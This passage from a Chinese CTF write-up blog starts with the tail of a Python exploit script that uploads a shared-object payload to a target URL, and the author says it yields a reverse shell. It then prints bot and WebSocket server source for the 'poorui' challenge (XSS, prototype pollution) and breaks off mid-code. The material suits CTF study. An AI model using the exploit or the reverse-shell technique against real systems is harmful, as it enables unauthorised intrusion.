sys.argv[<span class="number">1</span>]</span><br><span class="line">    payload_filename = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(payload_filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &gt; PAYLOAD_MAX_LENGTH:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;payload size must not larger than %d&#x27;</span>, PAYLOAD_MAX_LENGTH)</span><br><span class="line"></span><br><span class="line">    parts = urlparse(target)</span><br><span class="line">    port = parts.port</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> parts.port:</span><br><span class="line">        <span class="keyword">if</span> parts.scheme == <span class="string">&#x27;https&#x27;</span>:</span><br><span class="line">            port = <span class="number">443</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">    context = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((parts.hostname, port), timeout=<span class="number">8</span>) <span class="keyword">as</span> client:</span><br><span class="line">        <span class="keyword">if</span> parts.scheme == <span class="string">&#x27;https&#x27;</span>:</span><br><span class="line">            <span class="keyword">with</span> context.wrap_socket(client, server_hostname=parts.hostname) <span class="keyword">as</span> ssock:</span><br><span class="line">                exploit(ssock, parts, data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exploit(client, parts, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>用法是<code>python exp.py http://target [path of so.file]</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678204703992-01cb27e1-12be-497e-bbb7-f2fc2fd8a026.png#averageHue=%23070706&clientId=u7e1e3703-b617-4&from=paste&height=310&id=u5fd1df21&name=image.png&originHeight=388&originWidth=1374&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15863&status=done&style=none&taskId=u08de8924-038d-42e3-a148-8d256edf772&title=&width=1099.2" alt="image.png"><br>直接反弹shell，这里提一嘴，windows的docker对于复现漏洞，有时候可能还是比较抽象的，比如这个windows的docker就复刻不了，cgi服务器会报500的错误，我猜测这应该是端口占用之类的原因吧，所以说还是有弊有利的windows docker<br>但是大部分时间还是不会抽风的（呜呜呜windows你能不能支棱起来啊）</p>
<h1 id="poorui"><a href="#poorui" class="headerlink" title="poorui"></a>poorui</h1><p>考点：websockets，xss，原型链污染<br>借这个题学了一波websockets：<br><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2017/05/websocket.html">https://www.ruanyifeng.com/blog/2017/05/websocket.html</a><br>这一题也是出现了十分严重的非预期，首先看看bot的行为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">WebSocket</span> <span class="keyword">from</span> <span class="string">&quot;ws &quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">FLAG</span>, <span class="variable constant_">WS_SERVER</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./config.js&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; isJson &#125; <span class="keyword">from</span> <span class="string">&quot;./util.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> conn = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="variable constant_">WS_SERVER</span>)</span><br><span class="line"><span class="keyword">const</span> username = <span class="string">&#x27;flagbot&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleLogin</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    conn.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; </span><br><span class="line">        <span class="attr">api</span>: <span class="string">&quot;login&quot;</span>, </span><br><span class="line">        <span class="attr">username</span>: username </span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleGetFlag</span> = (<span class="params"><span class="keyword">from</span></span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[getflag]&#x27;</span>, <span class="keyword">from</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">from</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        conn.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">            <span class="attr">api</span>: <span class="string">&#x27;sendflag&#x27;</span>,</span><br><span class="line">            <span class="attr">flag</span>: <span class="variable constant_">FLAG</span>,</span><br><span class="line">            <span class="attr">to</span>: <span class="keyword">from</span></span><br><span class="line">        &#125;))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleList</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(list)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleMsg</span> = (<span class="params">msg</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">switch</span>(msg.<span class="property">api</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;login&quot;</span>:</span><br><span class="line">            <span class="title function_">handleLogin</span>()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;list&quot;</span>:</span><br><span class="line">            <span class="title function_">handleList</span>(msg.<span class="property">peers</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;getflag&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span>(msg.<span class="property">from</span>) <span class="title function_">handleGetFlag</span>(msg.<span class="property">from</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;unknown api&quot;</span>, msg.<span class="property">api</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn.<span class="property">onopen</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> msg = &#123;</span><br><span class="line">        <span class="attr">api</span>: <span class="string">&quot;ping&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: <span class="string">&quot;hello world&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(msg))</span><br><span class="line">    conn.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">api</span>: <span class="string">&quot;list&quot;</span>&#125;))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn.<span class="title function_">on</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="params">msg</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[onmessage]&#x27;</span>, msg.<span class="title function_">toString</span>())</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">isJson</span>(msg))&#123;</span><br><span class="line">        <span class="title function_">handleMsg</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(msg))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> puppeteer <span class="keyword">from</span> <span class="string">&quot;puppeteer&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SERVER_URL</span> = <span class="string">&#x27;http://localhost:8081/chat&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">        <span class="attr">headless</span>: process.<span class="property">env</span>.<span class="property">DEBUG</span> ?? <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="variable constant_">SERVER_URL</span>)</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;#username&#x27;</span>, <span class="variable constant_">USERNAME</span>)</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&#x27;#btn-login&#x27;</span>)</span><br><span class="line">    page.<span class="title function_">on</span>(<span class="string">&#x27;load&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(page.<span class="title function_">url</span>())</span><br><span class="line">        <span class="keyword">if</span>(page.<span class="title function_">url</span>() !== <span class="variable constant_">SERVER_URL</span>)&#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">                <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="variable constant_">SERVER_URL</span>)</span><br><span class="line">                <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;#username&#x27;</span>, <span class="variable constant_">USERNAME</span>)</span><br><span class="line">                <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&#x27;#btn-login&#x27;</span>)</span><br><span class="line">            &#125;, <span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">WebSocketServer</span> &#125; <span class="keyword">from</span> <span class="string">&quot;ws&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createServer &#125; <span class="keyword">from</span> <span class="string">&quot;http&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> bodyParser <span class="keyword">from</span> <span class="string">&#x27;body-parser&#x27;</span></span><br><span class="line"><span class="keyword">import</span> fs <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; v4 <span class="keyword">as</span> uuidv4 &#125; <span class="keyword">from</span> <span class="string">&#x27;uuid&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">PORT</span>, <span class="variable constant_">LISTEN</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./config.js&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; fileURLToPath &#125; <span class="keyword">from</span> <span class="string">&quot;url&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> __filename = <span class="title function_">fileURLToPath</span>(<span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">url</span>)</span><br><span class="line"><span class="keyword">const</span> __dirname = path.<span class="title function_">dirname</span>(__filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> http = <span class="title function_">createServer</span>(app)</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">TPL_PATH</span> = <span class="string">&#x27;./tpls&#x27;</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/hello&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/tplCreate&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> tpl = req.<span class="property">body</span>.<span class="property">tpl</span></span><br><span class="line">    <span class="keyword">if</span>(!tpl)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;no tpl field specified!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> tplName = <span class="title function_">uuidv4</span>() + <span class="string">&#x27;.tpl&#x27;</span></span><br><span class="line">    fs.<span class="title function_">writeFile</span>(path.<span class="title function_">join</span>(<span class="variable constant_">TPL_PATH</span>, tplName), tpl, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123; <span class="string">&#x27;tplID&#x27;</span>: tplName &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/tplView&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> tplName = req.<span class="property">query</span>.<span class="property">tpl</span></span><br><span class="line">    <span class="keyword">if</span>(!tplName || !tplName.<span class="title function_">endsWith</span>(<span class="string">&#x27;.tpl&#x27;</span>))&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;wrong tpl id!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html&#x27;</span>)</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="variable constant_">TPL_PATH</span>, tplName), <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) res.<span class="title function_">send</span>(err)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/tplList&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">json</span>(fs.<span class="title function_">readdirSync</span>(<span class="variable constant_">TPL_PATH</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;*&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> wss = <span class="keyword">new</span> <span class="title class_">WebSocketServer</span>(&#123; <span class="attr">server</span>: http &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> clients = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"><span class="keyword">const</span> ws2username = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"><span class="keyword">const</span> username2ws = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sendWarning</span> = (<span class="params">ws, warning</span>) =&gt; &#123;</span><br><span class="line">    ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">api</span>: <span class="string">&#x27;warning&#x27;</span>,</span><br><span class="line">        <span class="attr">warning</span>: warning</span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">apiPing</span> = (<span class="params">ws</span>) =&gt; &#123; ws.<span class="title function_">send</span>(<span class="string">&#x27;pong&#x27;</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">apiList</span> = (<span class="params">ws</span>) =&gt; &#123; </span><br><span class="line">    ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">api</span>: <span class="string">&#x27;list&#x27;</span>,</span><br><span class="line">        <span class="attr">peers</span>: <span class="title class_">Array</span>.<span class="title function_">from</span>(username2ws.<span class="title function_">keys</span>())</span><br><span class="line">    &#125;)) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">apiSendmsg</span> = (<span class="params">ws, content, to</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!username2ws.<span class="title function_">has</span>(to))&#123; </span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// console.log(ws2username)</span></span><br><span class="line">    <span class="keyword">if</span>(content.<span class="property">type</span> == <span class="string">&#x27;tpl&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> tplfile = path.<span class="title function_">join</span>(<span class="variable constant_">TPL_PATH</span>, content.<span class="property">data</span>.<span class="property">tpl</span>)</span><br><span class="line">        <span class="keyword">if</span>(!tplfile.<span class="title function_">endsWith</span>(<span class="string">&#x27;.tpl&#x27;</span>))&#123;</span><br><span class="line">            tplfile += <span class="string">&#x27;.tpl&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        content.<span class="property">data</span>.<span class="property">tpl</span> = fs.<span class="title function_">existsSync</span>(tplfile) ? fs.<span class="title function_">readFileSync</span>(tplfile).<span class="title function_">toString</span>() : <span class="string">&#x27;***&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    username2ws.<span class="title function_">get</span>(to).<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">api</span>: <span class="string">&quot;message&quot;</span>, </span><br><span class="line">        <span class="attr">from</span>: ws2username.<span class="title function_">get</span>(ws), </span><br><span class="line">        <span class="attr">content</span>: content</span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">apiLogin</span> = (<span class="params">ws, username</span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(username)</span><br><span class="line">    ws2username.<span class="title function_">set</span>(ws, username)</span><br><span class="line">    <span class="keyword">if</span>(username2ws.<span class="title function_">has</span>(username))&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(username, <span class="string">&quot;logged in already&quot;</span>)</span><br><span class="line">        <span class="title function_">sendWarning</span>(ws, <span class="string">&#x27;username already used!&#x27;</span>)</span><br><span class="line">        ws.<span class="title function_">close</span>()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">        <span class="comment">// username2ws.get(username).close()</span></span><br><span class="line">    &#125;</span><br><span class="line">    username2ws.<span class="title function_">set</span>(username, ws)</span><br><span class="line">    ws.<span class="title function_">send</span>(<span class="string">`Now you are <span class="subst">$&#123;username&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">apiSendFlag</span> = (<span class="params">ws, flag, to</span>) =&gt; &#123;</span><br><span class="line">    username2ws.<span class="title function_">get</span>(to).<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">api</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">        <span class="attr">flag</span>: flag</span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">apiGetFlag</span> = (<span class="params">ws</span>) =&gt; &#123;</span><br><span class="line">    username2ws.<span class="title function_">get</span>(<span class="string">&#x27;flagbot&#x27;</span>).<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">api</span>: <span class="string">&quot;getflag&quot;</span>,</span><br><span class="line">        <span class="attr">from</span>: ws2username.<span class="title function_">get</span>(ws)</span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleMsg</span> = (<span class="params">msg, ws</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">switch</span>(msg.<span class="property">api</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;login&quot;</span>:</span><br><span class="line">            <span class="title function_">apiLogin</span>(ws, msg.<span class="property">username</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;ping&quot;</span>:</span><br><span class="line">            <span class="title function_">apiPing</span>(ws)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">            <span class="title function_">apiList</span>(ws)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;sendmsg&#x27;</span>:</span><br><span class="line">            <span class="title function_">apiSendmsg</span>(ws, msg.<span class="property">msg</span>, msg.<span class="property">to</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;sendflag&#x27;</span>:</span><br><span class="line">            <span class="title function_">apiSendFlag</span>(ws, msg.<span class="property">flag</span>, msg.<span class="property">to</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;getflag&#x27;</span>:</span><br><span class="line">            <span class="title function_">apiGetFlag</span>(ws)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;unknown api&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleConn</span> = (<span class="params">ws, addr</span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// console.log(typeof ws)</span></span><br><span class="line">    ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">api</span>: <span class="string">&quot;login&quot;</span> &#125;)) <span class="comment">// login required</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!ws2username.<span class="title function_">has</span>(ws)) ws.<span class="title function_">close</span>()</span><br><span class="line">    &#125;, <span class="number">5000</span>)</span><br><span class="line">    </span><br><span class="line">    ws.<span class="title function_">on</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="params">msg</span> =&gt;</span> 